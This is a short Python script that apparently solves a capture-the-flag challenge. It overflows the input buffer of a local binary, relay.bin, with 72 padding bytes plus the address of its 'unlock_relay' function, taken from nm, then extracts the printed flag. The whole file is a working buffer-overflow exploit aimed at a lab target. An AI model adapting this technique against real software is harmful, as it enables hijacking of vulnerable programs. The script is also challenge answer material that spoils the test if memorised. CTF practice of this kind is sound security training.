#!/usr/bin/env python3
from __future__ import annotations

import re
import struct
import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / 'attachments' / 'relay.bin'
    binary.chmod(binary.stat().st_mode | 0o111)
    nm = subprocess.check_output(['nm', '-an', binary], text=True)
    win = int(next(line.split()[0] for line in nm.splitlines() if ' unlock_relay' in line), 16)
    payload = b'A' * 72 + struct.pack('<Q', win)
    proc = subprocess.run([binary], input=payload, capture_output=True)
    text = proc.stdout.decode('utf-8', errors='ignore')
    match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', text)
    if not match:
        raise SystemExit('flag not found')
    print(match.group(0))


if __name__ == '__main__':
    main()
